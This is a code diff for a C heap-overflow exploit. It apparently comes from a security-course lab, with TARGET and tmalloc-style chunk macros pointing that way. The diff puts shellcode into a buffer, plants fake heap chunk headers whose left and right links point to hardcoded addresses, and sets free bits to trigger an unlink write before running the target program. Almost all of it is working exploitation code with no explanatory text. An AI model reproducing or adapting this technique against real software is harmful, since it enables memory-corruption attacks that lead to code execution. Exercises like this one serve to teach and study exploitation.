@@ -46,6 +46,9 @@ typedef union CHUNK_TAG
 #define TOCHUNK(vp) (-1 + (CHUNK *)(vp))
 #define FROMCHUNK(chunk) ((void *)(1 + (chunk)))
 
+#define PPOINTER 0x8059878 
+#define QPOINTER 0x8059948 
+
 int main(void)
 {
   char *args[3];
@@ -56,13 +59,17 @@ int main(void)
   strncpy(buf+972, shellcode, 45);
   //strncpy(buf+244, "\x12\x34\x56\x78", 4);
 
-  void *vp = (void*)buf + (0x8059948 - 0x8059878);
+  void *vp = (void*)buf + (QPOINTER - PPOINTER);
   CHUNK *p = TOCHUNK(vp);
 
-  CHUNK *l = p->s.l = vp-sizeof(CHUNK);
-  CHUNK *r = p->s.r = vp+sizeof(CHUNK); 
+  p->s.l = (void*)QPOINTER-sizeof(CHUNK)-sizeof(CHUNK);
+  p->s.r = (void*)QPOINTER; 
 
+  CHUNK *l = TOCHUNK(vp-sizeof(CHUNK));
+  CHUNK *r = TOCHUNK(vp+sizeof(CHUNK));
+  
   SET_FREEBIT(l);
+  //SET_FREEBIT(r);
   SET_FREEBIT(p);
  
   args[0] = TARGET; 
